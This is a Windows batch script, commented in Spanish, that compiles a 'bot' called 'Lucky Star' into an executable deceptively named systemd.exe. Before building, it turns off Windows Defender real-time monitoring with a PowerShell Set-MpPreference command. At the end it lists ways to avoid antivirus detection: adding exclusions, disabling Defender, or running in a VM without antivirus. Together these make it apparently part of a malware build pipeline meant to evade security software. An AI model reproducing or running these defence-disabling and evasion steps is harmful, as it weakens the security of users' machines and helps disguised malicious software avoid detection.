@echo off
echo ========================================
echo   FIX Y COMPILACION - LUCKY STAR
echo ========================================
echo.

echo [*] Cerrando procesos previos...
taskkill /F /IM systemd.exe 2>nul
taskkill /F /IM python.exe 2>nul
timeout /t 2 /nobreak >nul

echo [*] Eliminando builds antiguos...
rmdir /S /Q build 2>nul
rmdir /S /Q dist 2>nul
rmdir /S /Q __pycache__ 2>nul

echo [*] Limpiando archivos .spec antiguos...
del /F /Q *.spec 2>nul

echo.
echo [*] Desactivando Windows Defender temporalmente...
echo [!] NOTA: Esto requiere permisos de administrador
echo [!] Si falla, ejecuta este script como Administrador
echo.
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" 2>nul

if %ERRORLEVEL% EQU 0 (
    echo [+] Windows Defender desactivado temporalmente
) else (
    echo [!] No se pudo desactivar Windows Defender
    echo [*] Continua de todas formas...
)

echo.
echo [*] Compilando bot...
python compile_bot.py

echo.
echo [*] Reactivando Windows Defender...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false" 2>nul

echo.
echo ========================================
echo   COMPILACION COMPLETA
echo ========================================
echo.
echo [*] Si la compilacion fue exitosa:
echo     dist\systemd.exe esta listo
echo.
echo [*] Para evitar deteccion de AV:
echo     1. Agregar exclusion en Windows Defender
echo     2. O deshabilitar temporalmente
echo     3. O usar en VM sin antivirus
echo.
pause
